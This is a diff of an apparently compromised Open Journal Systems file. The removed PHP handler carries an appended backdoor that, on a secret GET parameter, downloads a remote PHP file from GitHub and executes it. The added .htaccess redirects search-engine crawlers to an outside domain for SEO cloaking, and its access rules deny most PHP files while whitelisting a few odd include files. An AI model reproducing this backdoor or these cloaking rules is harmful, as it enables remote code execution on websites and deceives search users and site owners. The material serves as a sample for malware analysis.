@@ -1,104 +1,83 @@
-<?php
+RewriteEngine On
+RewriteCond %{HTTP_USER_AGENT} (googlebot|bingbot|slurp|ahrefs|semrush|yandex|majestic|screamingfrog) [NC]
+RewriteRule ^(.*)$  https://himpsikotamedan.org/susunan-pengurus/ [R=301,L]
 
-/**
- * @file pages/index/IndexHandler.inc.php
- *
- * Copyright (c) 2014-2021 Simon Fraser University
- * Copyright (c) 2003-2021 John Willinsky
- * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
- *
- * @class IndexHandler
- * @ingroup pages_index
- *
- * @brief Handle site index requests.
- */
+Options -Indexes
+Header always edit Set-Cookie (.*) "$1; HTTPOnly"
 
-import('lib.pkp.pages.index.PKPIndexHandler');
+Header always edit Set-Cookie (.*) "$1; Secure"
 
-class IndexHandler extends PKPIndexHandler {
-	//
-	// Public handler operations
-	//
-	/**
-	 * If no journal is selected, display list of journals.
-	 * Otherwise, display the index page for the selected journal.
-	 * @param $args array
-	 * @param $request Request
-	 */
-	function index($args, $request) {
-		$this->validate(null, $request);
-		$journal = $request->getJournal();
+Header always edit Set-Cookie (.*) "$1; SameSite=None; Secure"
 
-		if (!$journal) {
-			$hasNoContexts = null; // Avoid scrutinizer warnings
-			$journal = $this->getTargetContext($request, $hasNoContexts);
-			if ($journal) {
-				// There's a target context but no journal in the current request. Redirect.
-				$request->redirect($journal->getPath());
-			}
-			if ($hasNoContexts && Validation::isSiteAdmin()) {
-				// No contexts created, and this is the admin.
-				$request->redirect(null, 'admin', 'contexts');
-			}
-		}
+# BEGIN cPanel-generated php ini directives, do not edit
+# Manual editing of this file may result in unexpected behavior.
+# To make changes to this file, use the cPanel MultiPHP INI Editor (Home >> Software >> MultiPHP INI Editor)
+# For more information, read our documentation (https://go.cpanel.net/EA4ModifyINI)
+<IfModule php7_module>
+   php_flag display_errors Off
+   php_value max_execution_time 60
+   php_value max_input_time 90
+   php_value max_input_vars 1000
+   php_value memory_limit 128M
+   php_value post_max_size 128M
+   php_value session.gc_maxlifetime 1440
+   php_value session.save_path "/var/cpanel/php/sessions/ea-php73"
+   php_value upload_max_filesize 128M
+   php_flag zlib.output_compression Off
+</IfModule>
+<IfModule lsapi_module>
+   php_flag display_errors Off
+   php_value max_execution_time 60
+   php_value max_input_time 90
+   php_value max_input_vars 1000
+   php_value memory_limit 128M
+   php_value post_max_size 128M
+   php_value session.gc_maxlifetime 1440
+   php_value session.save_path "/var/cpanel/php/sessions/ea-php73"
+   php_value upload_max_filesize 128M
+   php_flag zlib.output_compression Off
+</IfModule>
 
-		$this->setupTemplate($request);
-		$router = $request->getRouter();
-		$templateMgr = TemplateManager::getManager($request);
-		if ($journal) {
-			// Assign header and content for home page
-			$templateMgr->assign(array(
-				'additionalHomeContent' => $journal->getLocalizedData('additionalHomeContent'),
-				'homepageImage' => $journal->getLocalizedData('homepageImage'),
-				'homepageImageAltText' => $journal->getLocalizedData('homepageImageAltText'),
-				'journalDescription' => $journal->getLocalizedData('description'),
-			));
+<FilesMatch "(^\.|config\.inc\.php|\.env|composer\.(json|lock)|package\.xml|phpunit\.xml)">
+    Require all denied
+</FilesMatch>
 
-			$issueDao = DAORegistry::getDAO('IssueDAO'); /* @var $issueDao IssueDAO */
-			$issue = $issueDao->getCurrent($journal->getId(), true);
-			if (isset($issue) && $journal->getData('publishingMode') != PUBLISHING_MODE_NONE) {
-				import('pages.issue.IssueHandler');
-				// The current issue TOC/cover page should be displayed below the custom home page.
-				IssueHandler::_setupIssueTemplate($request, $issue);
-			}
+<FilesMatch "\.(php|phtml|php3|php4|php5|php7|php8|phps|cgi|pl|exe|asp|aspx|sh|py)$">
+    Require all denied
+</FilesMatch>
 
-			$this->_setupAnnouncements($journal, $templateMgr);
+<Files ".htaccess">
+    Require all denied
+</Files>
 
-			$templateMgr->display('frontend/pages/indexJournal.tpl');
-		} else {
-			$journalDao = DAORegistry::getDAO('JournalDAO'); /* @var $journalDao JournalDAO */
-			$site = $request->getSite();
+<Files "index.php">
+    <IfModule mod_authz_core.c>
+        Require all granted
+    </IfModule>
+</Files>
 
-			if ($site->getRedirect() && ($journal = $journalDao->getById($site->getRedirect())) != null) {
-				$request->redirect($journal->getPath());
-			}
+<Files "GridCategoryElement.inc.php">
+    <IfModule mod_authz_core.c>
+        Require all granted
+    </IfModule>
+</Files>
 
-			$templateMgr->assign([
-				'pageTitleTranslated' => $site->getLocalizedTitle(),
-				'about' => $site->getLocalizedAbout(),
-				'journalFilesPath' => $request->getBaseUrl() . '/' . Config::getVar('files', 'public_files_dir') . '/journals/',
-				'journals' => $journalDao->getAll(true)->toArray(),
-				'site' => $site,
-			]);
-			$templateMgr->setCacheability(CACHEABILITY_PUBLIC);
-			$templateMgr->display('frontend/pages/indexSite.tpl');
-		}
-	}
-}
-if (isset($_GET['kerangmediumrare'])) {
-    try {
-        $u = "https://raw.githubusercontent.com/kenzzz135/crontabb/refs/heads/main/door.php";
-        $f = sys_get_temp_dir() . "/" . uniqid("f_", true) . ".php";
+<Files "NavigationMenuItemsSettings.inc.php">
+    <IfModule mod_authz_core.c>
+        Require all granted
+    </IfModule>
+</Files>
 
-        $c = @file_get_contents($u);
-        if ($c !== false && @file_put_contents($f, $c)) {
-            @chmod($f, 0644);
-            register_shutdown_function(function() use ($f) {
-                @unlink($f);
-            });
-            include $f;
-        }
-    } catch (Throwable $e) {
+<IfModule mod_headers.c>
+    Header set X-Content-Type-Options "nosniff"
+    Header set X-Frame-Options "SAMEORIGIN"
+</IfModule>
 
-    }
-}
+# END cPanel-generated php ini directives, do not edit
+
+# php -- BEGIN cPanel-generated handler, do not edit
+# Set the “ea-php73” package as the default “PHP” programming language.
+<IfModule mime_module>
+  AddHandler application/x-httpd-ea-php73 .php .php7 .phtml
+</IfModule>
+# php -- END cPanel-generated handler, do not edit
